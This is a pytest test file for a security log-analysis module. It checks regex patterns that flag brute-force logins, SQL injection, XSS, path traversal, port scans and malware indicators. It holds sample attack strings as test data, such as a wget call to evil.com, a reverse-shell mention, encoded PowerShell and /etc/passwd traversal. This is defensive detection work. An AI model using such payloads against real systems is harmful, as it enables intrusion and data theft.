"""Tests for modules/log_analysis.py"""
import os
import tempfile
import pytest
from collections import defaultdict
from modules.log_analysis import analyze_file, PATTERNS


class TestPatterns:
    """Verify each compiled regex pattern matches expected strings."""

    def test_brute_force_failed_password(self):
        assert PATTERNS["brute_force"].search("failed password for root from 10.0.0.1")

    def test_brute_force_authentication_failure(self):
        assert PATTERNS["brute_force"].search("authentication failure from 192.168.1.1")

    def test_brute_force_invalid_user(self):
        assert PATTERNS["brute_force"].search("Invalid user admin from 10.10.10.10")

    def test_brute_force_case_insensitive(self):
        assert PATTERNS["brute_force"].search("FAILED PASSWORD attempt detected")

    def test_brute_force_no_match(self):
        assert not PATTERNS["brute_force"].search("Successful login from 10.0.0.1")

    def test_sql_injection_union_select(self):
        assert PATTERNS["sql_injection"].search("GET /?id=1 UNION SELECT * FROM users")

    def test_sql_injection_drop_table(self):
        assert PATTERNS["sql_injection"].search("DROP TABLE users;")

    def test_sql_injection_or_1_equals_1(self):
        assert PATTERNS["sql_injection"].search("' OR 1=1 --")

    def test_sql_injection_information_schema(self):
        assert PATTERNS["sql_injection"].search("SELECT * FROM information_schema.tables")

    def test_sql_injection_no_match(self):
        assert not PATTERNS["sql_injection"].search("Normal database query executed")

    def test_xss_script_tag(self):
        assert PATTERNS["xss"].search("<script>alert('xss')</script>")

    def test_xss_javascript_protocol(self):
        assert PATTERNS["xss"].search("href=javascript:void(0)")

    def test_xss_onerror(self):
        assert PATTERNS["xss"].search("<img src=x onerror=alert(1)>")

    def test_xss_document_cookie(self):
        assert PATTERNS["xss"].search("document.cookie")

    def test_xss_no_match(self):
        assert not PATTERNS["xss"].search("Normal HTML response sent")

    def test_path_traversal_dotdot_slash(self):
        assert PATTERNS["path_traversal"].search("GET /../../etc/passwd")

    def test_path_traversal_url_encoded(self):
        assert PATTERNS["path_traversal"].search("GET /%2e%2e/etc/passwd")

    def test_path_traversal_double_encoded(self):
        assert PATTERNS["path_traversal"].search("GET /%252e%252e/etc/passwd")

    def test_path_traversal_no_match(self):
        assert not PATTERNS["path_traversal"].search("GET /api/v1/users")

    def test_suspicious_ip_private_10(self):
        assert PATTERNS["suspicious_ip"].search("Request from 10.0.0.1")

    def test_suspicious_ip_private_172(self):
        assert PATTERNS["suspicious_ip"].search("Request from 172.16.0.1")

    def test_suspicious_ip_private_192_168(self):
        assert PATTERNS["suspicious_ip"].search("Request from 192.168.1.100")

    def test_suspicious_ip_no_match_public(self):
        assert not PATTERNS["suspicious_ip"].search("Request from 8.8.8.8")

    def test_port_scan_nmap(self):
        assert PATTERNS["port_scan"].search("nmap scan detected from host")

    def test_port_scan_masscan(self):
        assert PATTERNS["port_scan"].search("masscan activity blocked")

    def test_port_scan_no_match(self):
        assert not PATTERNS["port_scan"].search("Normal web request received")

    def test_malware_indicator_cmd(self):
        assert PATTERNS["malware_indicator"].search("Executed: cmd.exe /c whoami")

    def test_malware_indicator_powershell(self):
        assert PATTERNS["malware_indicator"].search("powershell -enc ZQBj...")

    def test_malware_indicator_wget(self):
        assert PATTERNS["malware_indicator"].search("wget http://evil.com/malware")

    def test_malware_indicator_base64(self):
        assert PATTERNS["malware_indicator"].search("echo base64 encoded payload")

    def test_malware_indicator_bin_sh(self):
        assert PATTERNS["malware_indicator"].search("spawn /bin/sh reverse shell")

    def test_malware_indicator_no_match(self):
        assert not PATTERNS["malware_indicator"].search("Normal application log entry")


class TestAnalyzeFile:
    def _write_log(self, content):
        f = tempfile.NamedTemporaryFile(mode='w', suffix='.log', delete=False)
        f.write(content)
        f.close()
        return f.name

    def test_file_not_found(self, capsys):
        analyze_file("/nonexistent/path/to/file.log")
        captured = capsys.readouterr()
        assert "File not found" in captured.out

    def test_empty_file(self, capsys):
        path = self._write_log("")
        try:
            result = analyze_file(path)
            captured = capsys.readouterr()
            assert "Total lines analyzed: 0" in captured.out
            assert result is not None
        finally:
            os.unlink(path)

    def test_clean_log_no_threats(self, capsys):
        path = self._write_log("2024-01-01 INFO User logged in successfully\n")
        try:
            result = analyze_file(path)
            captured = capsys.readouterr()
            assert "No obvious security threats detected." in captured.out
        finally:
            os.unlink(path)

    def test_detects_brute_force(self, capsys):
        path = self._write_log("failed password for root from 10.0.0.1\n" * 5)
        try:
            result = analyze_file(path)
            assert "brute_force" in result
            assert len(result["brute_force"]) == 5
        finally:
            os.unlink(path)

    def test_detects_sql_injection(self, capsys):
        path = self._write_log("GET /?q=1 UNION SELECT * FROM users HTTP/1.1\n")
        try:
            result = analyze_file(path)
            assert "sql_injection" in result
        finally:
            os.unlink(path)

    def test_detects_xss(self, capsys):
        path = self._write_log("POST /comment body=<script>alert(1)</script>\n")
        try:
            result = analyze_file(path)
            assert "xss" in result
        finally:
            os.unlink(path)

    def test_detects_path_traversal(self, capsys):
        path = self._write_log("GET /../../etc/passwd HTTP/1.1\n")
        try:
            result = analyze_file(path)
            assert "path_traversal" in result
        finally:
            os.unlink(path)

    def test_counts_ip_addresses(self, capsys):
        path = self._write_log(
            "10.0.0.1 GET /index.html\n"
            "10.0.0.1 GET /about.html\n"
            "192.168.1.5 POST /login\n"
        )
        try:
            result = analyze_file(path)
            captured = capsys.readouterr()
            assert "10.0.0.1" in captured.out
        finally:
            os.unlink(path)

    def test_returns_findings_dict(self):
        path = self._write_log("failed password for admin\n")
        try:
            result = analyze_file(path)
            assert isinstance(result, defaultdict)
        finally:
            os.unlink(path)

    def test_multiple_threats_same_line(self, capsys):
        # A line with both SQL injection and XSS indicators
        path = self._write_log("GET /?id=1 UNION SELECT <script>alert(1)</script>\n")
        try:
            result = analyze_file(path)
            assert "sql_injection" in result
            assert "xss" in result
        finally:
            os.unlink(path)

    def test_limits_display_to_three_matches(self, capsys):
        # Write 10 matching lines; output should show 3 + "... and 7 more"
        path = self._write_log("failed password for root\n" * 10)
        try:
            analyze_file(path)
            captured = capsys.readouterr()
            assert "and 7 more" in captured.out
        finally:
            os.unlink(path)

    def test_total_lines_count(self, capsys):
        path = self._write_log("line1\nline2\nline3\n")
        try:
            analyze_file(path)
            captured = capsys.readouterr()
            assert "Total lines analyzed: 3" in captured.out
        finally:
            os.unlink(path)

    def test_file_with_encoding_errors(self, capsys):
        # Write binary content that would cause encoding errors
        f = tempfile.NamedTemporaryFile(suffix='.log', delete=False)
        f.write(b"normal line\nfailed password\n\xff\xfe invalid bytes\n")
        f.close()
        path = f.name
        try:
            result = analyze_file(path)
            assert "brute_force" in result
        finally:
            os.unlink(path)

    def test_no_ai_analysis_when_no_agent(self, capsys):
        path = self._write_log("GET /index.html\n")
        try:
            analyze_file(path, ai_agent=None)
            captured = capsys.readouterr()
            assert "AI Analysis" not in captured.out
        finally:
            os.unlink(path)
